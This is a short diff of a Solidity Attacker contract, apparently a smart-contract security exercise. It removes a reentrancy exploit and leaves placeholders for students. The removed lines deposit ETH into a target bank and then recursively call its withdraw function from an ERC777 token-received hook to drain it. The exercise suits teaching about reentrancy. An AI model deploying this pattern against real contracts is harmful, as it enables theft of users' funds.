@@ -37,12 +37,6 @@ contract Attacker is AccessControl, IERC777Recipient {
 	function attack(uint256 amt) payable public {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
-
-		require(amt > 0, "Must send ETH to attack");
-		bank.deposit{value: amt}(); // Trigger deposit that gives us tokens
-		emit Deposit(amt);
-		bank.withdraw(amt); // Start the attack by calling withdraw once
-
 	}
 
 	/*
@@ -64,17 +58,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 		uint256 amount,
 		bytes calldata userData,
 		bytes calldata operatorData
-	) external override {
+	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-
-		emit Recurse(depth);
-		
-		if (depth < max_depth) {
-			depth++;
-			bank.withdraw(amount); // Recursive call to reenter the Bank's withdraw
-		}
-
 	}
 
 }
-
